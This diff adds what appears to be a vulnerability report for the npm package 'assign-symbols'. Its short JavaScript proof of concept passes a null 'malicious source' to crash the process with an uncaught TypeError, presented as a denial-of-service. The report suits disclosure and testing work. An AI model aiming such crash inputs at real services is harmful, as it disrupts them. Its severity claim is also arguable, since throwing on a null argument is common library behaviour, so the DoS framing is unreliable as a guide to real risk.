@@ -1,0 +1,25 @@
+Confirmed: `getSymbols` (aliased to `Object.getOwnPropertySymbols`) is called on each variadic argument without any null/undefined guard, so a crafted `null`/`undefined` source object crashes the process with an uncaught `TypeError` — a denial-of-service sink.
+
+```javascript
+'use strict';
+
+// assign-symbols copies enumerable Symbol-keyed properties from source
+// arguments onto a target object. Internally (index.js:12,24) it does:
+//   const getSymbols = Object.getOwnPropertySymbols;
+//   ...
+//   let names = getSymbols(arg);
+// `arg` comes straight from the variadic ...args with no null/undefined
+// check, so an attacker-controlled merge source of null/undefined causes
+// Object.getOwnPropertySymbols to throw, crashing the process (DoS).
+
+const assignSymbols = require("assign-symbols");
+
+const target = {};
+
+// Attacker-controlled "source" object passed to the merge call.
+const maliciousSource = null;
+
+console.log("Before: calling assignSymbols with a malicious null source...");
+assignSymbols(target, maliciousSource); // throws inside getSymbols -> uncaught TypeError
+console.log("This line is never reached.");
+```
